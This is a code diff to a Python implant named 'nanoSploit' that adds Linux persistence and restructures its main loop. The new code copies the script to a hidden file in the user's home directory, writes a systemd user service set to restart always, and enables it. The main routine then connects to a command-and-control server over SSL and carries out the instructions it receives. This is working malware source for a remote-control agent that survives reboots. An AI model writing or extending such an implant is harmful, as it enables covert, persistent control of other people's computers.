@@ -3,11 +3,23 @@ import ssl
 import subprocess
 import os
 import platform
-import time
+from shutil import copyfile
 
 # Static globals
 SYSTEM = platform.system()
 LOCK_PATH = "/tmp/nanosploit.lock" if SYSTEM == "Linux" else "C:/temp/nanosploit.lock"
+SYSTEMD_UNIT = """[Unit]
+Description=nanoSploit
+After=network.target
+
+[Service]
+ExecStart={0}/.nanosploit
+Restart=always
+RestartSec=3
+
+[Install]
+WantedBy=default.target
+"""
 
 ''' PERSISTENCE '''
 
@@ -19,28 +31,52 @@ def check_lock() -> bool:
         with open(LOCK_PATH, 'r') as file:
             pid = file.read().strip()
 
-        # Check if PID is still running
+        # Check if PID is running
         if SYSTEM == 'Windows':
             import ctypes
             kernel32 = ctypes.windll.kernel32
             handle = kernel32.OpenProcess(1, False, int(pid))
             if handle != 0:
-                # Process is still running
+                # PID is running
                 return True
         elif SYSTEM == "Linux":
             if os.path.exists(f"/proc/{pid}"):
-                # Process is still running
+                # PID is running
                 return True
 
-    # Create the lock file and write the current process ID to it
+    # Create the lock file and write the current PID
     with open(LOCK_PATH, 'w') as file:
         file.write(str(os.getpid()))
 
     return False
 
 
+def systemd_service(home_path: str):
+    user_service_path = f"{home_path}/.config/systemd/user"
+
+    # Creat systemd service directory
+    if not os.path.exists(user_service_path):
+        os.makedirs(user_service_path)
+
+    # Write service file
+    with open(f"{user_service_path}/nanosploit.service", "w") as f:
+        f.write(SYSTEMD_UNIT.format(home_path))
+
+    os.system("systemctl --user enable nanosploit")
+    os.system("systemctl --user start nanosploit")
+
+    print("Successfully set systemd service !")
+
+
 def persistence_linux():
-    pass
+    home_path = os.getenv("HOME")
+    payload_path = f"{home_path}/.nanosploit"
+
+    if not os.path.exists(payload_path):
+        os.system(f"cp {__file__} {payload_path}")
+
+    # Run persistence
+    systemd_service(home_path)
 
 
 def persistence_windows():
@@ -100,25 +136,7 @@ def init_connection() -> ssl.SSLSocket:
     return ss
 
 
-''' MAIN '''
-
-
-def main():
-    # Exit if already running
-    if check_lock():
-        print("Already running, exiting...")
-        return
-
-    # Persistence
-    if platform.system() == "Linux":
-        persistence_linux()
-    elif platform.system() == "Windows":
-        persistence_windows()
-
-    # Start secure connection with C2
-    ss = init_connection()
-
-    # Handle server commands
+def process_instructions(ss: ssl.SSLSocket):
     while True:
         buffer = ss.recv()
         if buffer:
@@ -136,6 +154,33 @@ def main():
         else:
             print("Lost server connection, exiting...")
             break
+
+
+''' MAIN '''
+
+
+def main():
+    # Exit if already running
+    if check_lock():
+        print("Already running, exiting...")
+        return
+    print("Lock is free !")
+
+    # Persistence
+    print("Start persistence...")
+    if platform.system() == "Linux":
+        persistence_linux()
+    elif platform.system() == "Windows":
+        persistence_windows()
+    print("Finished persistence !")
+
+    # Start secure connection with C2
+    ss = init_connection()
+    print("Successfully connected to C2 server !")
+
+    # Handle server commands
+    print("Start listening for server instructions...")
+    process_instructions(ss)
 
     # Exit program and delete lock file
     os.system(f"rm {LOCK_PATH}")
